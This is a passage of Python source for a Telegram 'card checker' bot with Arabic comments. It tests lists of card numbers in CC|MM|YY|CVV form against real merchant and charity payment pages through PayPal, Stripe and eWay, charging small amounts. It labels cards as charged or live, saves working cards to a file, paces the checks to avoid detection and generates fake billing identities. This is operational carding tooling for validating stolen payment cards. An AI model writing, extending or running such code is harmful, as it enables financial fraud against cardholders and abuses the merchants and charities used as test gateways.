        'country_emoji': '',
        'type': 'UNKNOWN',
        'brand': 'UNKNOWN'
    }

def format_card_result(card, result, user_info, check_time):
    """تنسيق نتيجة فحص البطاقة"""
    parts = card.split('|')
    cc = parts[0] if len(parts) > 0 else ''
    bin_info = get_bin_info(cc)
    
    status_text = ""
    if result['status'] in ['CHARGED']:
        status_text = "CHARGED"
    elif result['status'] in ['APPROVED', 'CVV_LIVE', 'CVV_ERROR', 'LOW_FUNDS']:
        status_text = "APPROVED (Live)"
    elif result['status'] == 'OTP':
        status_text = "OTP Required"
    elif result['status'] == 'EXPIRED':
        status_text = "EXPIRED"
    else:
        status_text = "DECLINED"
    
    text = f"""
Card Check Result
====================
Card: {cc[:6]}******{cc[-4:] if len(cc) > 4 else ''}
Expiry: {parts[1] if len(parts) > 1 else 'XX'}/{parts[2] if len(parts) > 2 else 'XX'}
Bank: {bin_info['bank']}
Country: {bin_info['country']} {bin_info['country_emoji']}
Type: {bin_info['brand']} {bin_info['type']}
====================
Status: {status_text}
Response: {result.get('message', 'Unknown')}
Gateway: {result.get('gateway', 'Unknown')}
Amount: {result.get('amount', 'N/A')}
Time: {check_time:.1f}s
====================
"""
    
    if user_info:
        text += f"""Name: {user_info.get('first_name', '')} {user_info.get('last_name', '')}
Email: {user_info.get('email', '')}
====================
"""
    
    text += "Bot: @chkchannel11"
    
    return text

async def save_valid_card(card, result):
    """حفظ البطاقة الصالحة"""
    try:
        async with aiofiles.open(VALID_CARDS_FILE, 'a') as f:
            await f.write(f"{card}|{result['status']}|{result.get('gateway', 'Unknown')}|{datetime.now().isoformat()}\n")
    except Exception as e:
        logger.error(f"Error saving valid card: {e}")

async def process_combo_file(file_path, gateway_name, user_id, status_message, callback=None):
    """معالجة ملف الكومبو"""
    results = {
        'total': 0,
        'charged': 0,
        'approved': 0,
        'declined': 0,
        'errors': 0
    }
    
    try:
        async with aiofiles.open(file_path, 'r') as f:
            content = await f.read()
        
        cards = [line.strip() for line in content.split('\n') if '|' in line and len(line.strip()) > 10]
        results['total'] = len(cards)
        
        if results['total'] == 0:
            return results
        
        for i, card in enumerate(cards):
            # التحقق من الايقاف
            if user_id in user_sessions and user_sessions[user_id].get('stop_processing'):
                break
            
            start_time = time.time()
            
            # اختيار البوابة
            if gateway_name == 'crisiscafe':
                result, user_info = await gateway.check_card_crisiscafe(card)
            elif gateway_name == 'rarediseases':
                result, user_info = await gateway.check_card_rarediseases(card)
            elif gateway_name == 'shopify':
                result, user_info = await gateway.check_card_shopify(card)
            elif gateway_name == 'switchupcb':
                result, user_info = await gateway.check_card_switchupcb(card)
            elif gateway_name == 'sportyshealth':
                result, user_info = await gateway.check_card_sportyshealth(card)
            else:
                result, user_info = await gateway.check_card_crisiscafe(card)
            
            check_time = time.time() - start_time
            
            # تحديث العدادات
            if result['status'] == 'CHARGED':
                results['charged'] += 1
                await save_valid_card(card, result)
            elif result['status'] in ['APPROVED', 'CVV_LIVE', 'CVV_ERROR', 'LOW_FUNDS', 'OTP']:
                results['approved'] += 1
                await save_valid_card(card, result)
            elif result['status'] == 'ERROR':
                results['errors'] += 1
            else:
                results['declined'] += 1
            
            # تحديث الرسالة كل 3 بطاقات
            if (i + 1) % 3 == 0 or i == len(cards) - 1:
                try:
                    cc_parts = card.split('|')
                    cc_display = cc_parts[0][:6] + "****" if len(cc_parts) > 0 else "****"
                    
                    progress_text = f"""
Card: {cc_display}

Status: {result['status']}
Response: {result.get('message', '')}

Charged: [ {results['charged']} ]  |  Approved: [ {results['approved']} ]
Declined: [ {results['declined']} ]  |  Cards: [ {i+1}/{results['total']} ]

Gateway: {gateway_name}
Bot: @chkchannel11
"""
                    
                    stop_keyboard = InlineKeyboardBuilder()
                    stop_keyboard.add(InlineKeyboardButton(text="STOP", callback_data=f"stop_{user_id}"))
                    
                    await status_message.edit_text(progress_text, reply_markup=stop_keyboard.as_markup())
                except Exception as e:
                    logger.error(f"Error updating message: {e}")
            
            # تاخير بين البطاقات (8 ثواني)
            await asyncio.sleep(8)
        
        return results
        
    except Exception as e:
        logger.error(f"Error processing combo: {e}")
        return results

# ===========================================
# معالجات الاوامر
# ===========================================
@router.message(CommandStart())
async def cmd_start(message: Message):
    """معالج امر /start"""
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    # انشاء لوحة مفاتيح
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="Single Check", callback_data="single_check"),
        InlineKeyboardButton(text="Combo Check", callback_data="combo_check"),
        InlineKeyboardButton(text="Select Gateway", callback_data="select_gateway"),
        InlineKeyboardButton(text="Statistics", callback_data="stats"),
        InlineKeyboardButton(text="Help", callback_data="help"),
        InlineKeyboardButton(text="Generate Info", callback_data="generate_info"),
        InlineKeyboardButton(text="Join Channel", url="https://t.me/chkchannel11")
    )
    keyboard.adjust(2)
    
    welcome_text = f"""
{CHANEL_LOGO}

Welcome, @{username}!

Premium Card Checker Bot
Multi-Gateway Support (Real API)
Fast & Accurate Results
Detailed Card Information

Available Gateways:
- CrisisCafe PayPal $1.00
- RareDiseases PayPal $1.00
- Shopify Stripe $8.57
- SwitchUpCB PayPal $1.00
- SportysHealth eWay $9.95

Channel: @chkchannel11
Your ID: {user_id}

Choose an option below:
"""
    
    await message.answer(welcome_text, reply_markup=keyboard.as_markup())

@router.callback_query(F.data == "select_gateway")
async def select_gateway_handler(callback: CallbackQuery):
    """معالج اختيار البوابة"""
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="CrisisCafe PayPal $1", callback_data="gateway_crisiscafe"),
        InlineKeyboardButton(text="RareDiseases PayPal $1", callback_data="gateway_rarediseases"),
        InlineKeyboardButton(text="Shopify Stripe $8.57", callback_data="gateway_shopify"),
        InlineKeyboardButton(text="SwitchUpCB PayPal $1", callback_data="gateway_switchupcb"),
        InlineKeyboardButton(text="SportysHealth eWay $9.95", callback_data="gateway_sportyshealth"),
        InlineKeyboardButton(text="Back", callback_data="back_main")
    )
    keyboard.adjust(1)
    
    await callback.message.edit_text(
        "Select Gateway:\n\n"
        "1. CrisisCafe PayPal - $1.00 (Real API)\n"
        "2. RareDiseases PayPal - $1.00 (Real API)\n"
        "3. Shopify Stripe - $8.57 (Real API)\n"
        "4. SwitchUpCB PayPal - $1.00 (Real API)\n"
        "5. SportysHealth eWay - $9.95 (3D Secure)",
        reply_markup=keyboard.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data.startswith("gateway_"))
async def gateway_selected_handler(callback: CallbackQuery):
    """معالج البوابة المحددة"""
    gateway_name = callback.data.replace("gateway_", "")
    user_id = callback.from_user.id
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    
    user_sessions[user_id]['gateway'] = gateway_name
    
    gateway_names = {
        'crisiscafe': 'CrisisCafe PayPal $1.00',
        'rarediseases': 'RareDiseases PayPal $1.00',
        'shopify': 'Shopify Stripe $8.57',
        'switchupcb': 'SwitchUpCB PayPal $1.00',
        'sportyshealth': 'SportysHealth eWay $9.95'
    }
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="Single Check", callback_data="single_check"),
        InlineKeyboardButton(text="Combo Check", callback_data="combo_check"),
        InlineKeyboardButton(text="Back", callback_data="back_main")
    )
    keyboard.adjust(2)
    
    await callback.message.edit_text(
        f"Gateway Selected: {gateway_names.get(gateway_name, gateway_name)}\n\n"
        "You can now:\n"
        "- Send a card directly: CC|MM|YY|CVV\n"
        "- Send a .txt combo file\n"
        "- Use /check CC|MM|YY|CVV",
        reply_markup=keyboard.as_markup()
    )
    await callback.answer(f"Gateway: {gateway_names.get(gateway_name, gateway_name)}")

@router.callback_query(F.data == "single_check")
async def single_check_handler(callback: CallbackQuery):
    """معالج الفحص الفردي"""
    user_id = callback.from_user.id
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    
    user_sessions[user_id]['mode'] = 'single_check'
    current_gateway = user_sessions[user_id].get('gateway', 'crisiscafe')
    
    await callback.message.edit_text(
        f"Single Card Check\n\n"
        f"Current Gateway: {current_gateway}\n\n"
        "Send a card in format:\n"
        "CC|MM|YY|CVV\n\n"
        "Example: 4111111111111111|12|25|123"
    )
    await callback.answer()

@router.callback_query(F.data == "combo_check")
async def combo_check_handler(callback: CallbackQuery):
    """معالج فحص الكومبو"""
    user_id = callback.from_user.id
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    
    user_sessions[user_id]['mode'] = 'combo_check'
    current_gateway = user_sessions[user_id].get('gateway', 'crisiscafe')
    
    await callback.message.edit_text(
        f"Combo File Check\n\n"
        f"Current Gateway: {current_gateway}\n\n"
        "Send a .txt file containing cards.\n\n"
        "File Format:\n"
        "- One card per line\n"
        "- Format: CC|MM|YY|CVV\n"
        "- Example: 5208130007850658|09|26|768\n\n"
        "Features:\n"
        "- Real API checking\n"
        "- Auto-saves valid cards\n"
        "- Live progress updates\n"
        "- 8 seconds delay between cards\n\n"
        "/back to main menu"
    )
    await callback.answer()

@router.callback_query(F.data == "stats")
async def stats_handler(callback: CallbackQuery):
    """معالج الاحصائيات"""
    user_id = callback.from_user.id
    
    stats = user_stats.get(user_id, {
        'total_checks': 0,
        'approved': 0,
        'declined': 0
    })
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(text="Back", callback_data="back_main"))
    
    await callback.message.edit_text(
        f"Your Statistics\n\n"
        f"Total Checks: {stats.get('total_checks', 0)}\n"
        f"Approved: {stats.get('approved', 0)}\n"
        f"Declined: {stats.get('declined', 0)}\n",
        reply_markup=keyboard.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data == "help")
async def help_handler(callback: CallbackQuery):
    """معالج المساعدة"""
    keyboard = InlineKeyboardBuilder()
    keyboard.add(InlineKeyboardButton(text="Back", callback_data="back_main"))
    
    await callback.message.edit_text(
        "Help\n\n"
        "Commands:\n"
        "/start - Start the bot\n"
        "/check CC|MM|YY|CVV - Check a card\n"
        "/gate - Select gateway\n"
        "/stats - View statistics\n\n"
        "Supported Gateways (Real API):\n"
        "- CrisisCafe PayPal $1.00\n"
        "- RareDiseases PayPal $1.00\n"
        "- Shopify Stripe $8.57\n"
        "- SwitchUpCB PayPal $1.00\n"
        "- SportysHealth eWay $9.95\n\n"
        "Card Format: CC|MM|YY|CVV\n"
        "Example: 4111111111111111|12|25|123\n\n"
        "Contact: @chkchannel11",
        reply_markup=keyboard.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data == "generate_info")
async def generate_info_handler(callback: CallbackQuery):
    """معالج توليد المعلومات"""
    user_info = gateway.generate_random_user()
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="Generate New", callback_data="generate_info"),
        InlineKeyboardButton(text="Back", callback_data="back_main")
    )
    keyboard.adjust(2)
    
    await callback.message.edit_text(
        f"Generated User Info\n\n"
        f"Name: {user_info['first_name']} {user_info['last_name']}\n"
        f"Email: {user_info['email']}\n"
        f"Phone: {user_info['phone']}\n"
        f"Address: {user_info['address']}\n"
        f"City: {user_info['city']}\n"
        f"State: {user_info['state']}\n"
        f"ZIP: {user_info['zip']}\n"
        f"Country: {user_info['country']}",
        reply_markup=keyboard.as_markup()
    )
    await callback.answer()

@router.callback_query(F.data == "back_main")
async def back_main_handler(callback: CallbackQuery):
    """معالج العودة للقائمة الرئيسية"""
    await cmd_start(callback.message)
    await callback.answer()

@router.callback_query(F.data.startswith("stop_"))
async def stop_processing_handler(callback: CallbackQuery):
    """معالج ايقاف الفحص"""
    user_id = int(callback.data.replace("stop_", ""))
    
    if callback.from_user.id == user_id:
        if user_id in user_sessions:
            user_sessions[user_id]['stop_processing'] = True
        await callback.answer("Processing stopped!")
    else:
        await callback.answer("You cannot stop this process!")

@router.message(Command("check"))
async def check_command(message: Message):
    """معالج امر الفحص"""
    user_id = message.from_user.id
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("Usage: /check CC|MM|YY|CVV")
        return
    
    card = args[1].strip()
    if '|' not in card:
        await message.reply("Invalid format. Use: CC|MM|YY|CVV")
        return
    
    status_msg = await message.reply("Checking card... Please wait.")
    
    gateway_name = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    
    start_time = time.time()
    
    if gateway_name == 'crisiscafe':
        result, user_info = await gateway.check_card_crisiscafe(card)
    elif gateway_name == 'rarediseases':
        result, user_info = await gateway.check_card_rarediseases(card)
    elif gateway_name == 'shopify':
        result, user_info = await gateway.check_card_shopify(card)
    elif gateway_name == 'switchupcb':
        result, user_info = await gateway.check_card_switchupcb(card)
    elif gateway_name == 'sportyshealth':
        result, user_info = await gateway.check_card_sportyshealth(card)
    else:
        result, user_info = await gateway.check_card_crisiscafe(card)
    
    check_time = time.time() - start_time
    
    result_text = format_card_result(card, result, user_info, check_time)
    
    await status_msg.edit_text(result_text)
    
    if result['status'] in ['CHARGED', 'APPROVED', 'CVV_LIVE', 'CVV_ERROR', 'LOW_FUNDS']:
        await save_valid_card(card, result)

@router.message(Command("gate"))
async def gate_command(message: Message):
    """معالج امر البوابة"""
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="CrisisCafe PayPal $1", callback_data="gateway_crisiscafe"),
        InlineKeyboardButton(text="RareDiseases PayPal $1", callback_data="gateway_rarediseases"),
        InlineKeyboardButton(text="Shopify Stripe $8.57", callback_data="gateway_shopify"),
        InlineKeyboardButton(text="SwitchUpCB PayPal $1", callback_data="gateway_switchupcb"),
        InlineKeyboardButton(text="SportysHealth eWay $9.95", callback_data="gateway_sportyshealth"),
    )
    keyboard.adjust(1)
    
    await message.reply("Select Gateway:", reply_markup=keyboard.as_markup())

@router.message(F.document)
async def document_handler(message: Message):
    """معالج الملفات"""
    user_id = message.from_user.id
    
    if not message.document.file_name.endswith('.txt'):
        await message.reply("Please send a .txt file.")
        return
    
    # تحميل الملف
    file = await message.bot.get_file(message.document.file_id)
    file_path = f"/tmp/combo_{user_id}.txt"
    await message.bot.download_file(file.file_path, file_path)
    
    # اعداد الجلسة
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    
    user_sessions[user_id]['stop_processing'] = False
    
    gateway_name = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
    
    gateway_names = {
        'crisiscafe': 'CrisisCafe PayPal',
        'rarediseases': 'RareDiseases PayPal',
        'shopify': 'Shopify Stripe',
        'switchupcb': 'SwitchUpCB PayPal',
        'sportyshealth': 'SportysHealth eWay'
    }
    
    status_msg = await message.reply(f"Starting combo check with {gateway_names.get(gateway_name, gateway_name)}...\n\nPlease wait...")
    
    # معالجة الملف
    results = await process_combo_file(file_path, gateway_name, user_id, status_msg)
    
    # ارسال النتيجة النهائية
    final_text = f"""
Combo Processing Complete!

Results:
- Total Cards: {results['total']}
- Charged: {results['charged']}
- Approved: {results['approved']}
- Declined: {results['declined']}
- Errors: {results['errors']}

Success Rate: {((results['charged'] + results['approved']) / max(results['total'], 1) * 100):.2f}%

Gateway: {gateway_names.get(gateway_name, gateway_name)}
Valid cards saved to: valid_cards.txt

Bot: @chkchannel11
"""
    
    keyboard = InlineKeyboardBuilder()
    keyboard.add(
        InlineKeyboardButton(text="New Combo", callback_data="combo_check"),
        InlineKeyboardButton(text="Main Menu", callback_data="back_main")
    )
    keyboard.adjust(2)
    
    await status_msg.edit_text(final_text, reply_markup=keyboard.as_markup())
    
    # حذف الملف المؤقت
    try:
        os.remove(file_path)
    except:
        pass

@router.message()
async def message_handler(message: Message):
    """معالج الرسائل العامة"""
    user_id = message.from_user.id
    text = message.text
    
    if not text:
        return
    
    # التحقق من صيغة البطاقة
    if '|' in text and len(text.split('|')) >= 4:
        card = text.strip()
        
        status_msg = await message.reply("Checking card... Please wait.")
        
        gateway_name = user_sessions.get(user_id, {}).get('gateway', 'crisiscafe')
        
        start_time = time.time()
        
        if gateway_name == 'crisiscafe':
            result, user_info = await gateway.check_card_crisiscafe(card)
        elif gateway_name == 'rarediseases':
            result, user_info = await gateway.check_card_rarediseases(card)
        elif gateway_name == 'shopify':
            result, user_info = await gateway.check_card_shopify(card)
        elif gateway_name == 'switchupcb':
            result, user_info = await gateway.check_card_switchupcb(card)
        elif gateway_name == 'sportyshealth':
            result, user_info = await gateway.check_card_sportyshealth(card)
        else:
            result, user_info = await gateway.check_card_crisiscafe(card)
        
        check_time = time.time() - start_time
        
        result_text = format_card_result(card, result, user_info, check_time)
        
        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(text="Check Another", callback_data="single_check"),
            InlineKeyboardButton(text="Main Menu", callback_data="back_main")
        )
        keyboard.adjust(2)
        
        await status_msg.edit_text(result_text, reply_markup=keyboard.as_markup())
        
        if result['status'] in ['CHARGED', 'APPROVED', 'CVV_LIVE', 'CVV_ERROR', 'LOW_FUNDS']:
            await save_valid_card(card, result)

# ===========================================
# تشغيل البوت
# ===========================================
async def main():
    """الدالة الرئيسية"""
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=None))
    dp = Dispatcher()
    dp.include_router(router)
    
    logger.info("Bot started with Real API Gateways!")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
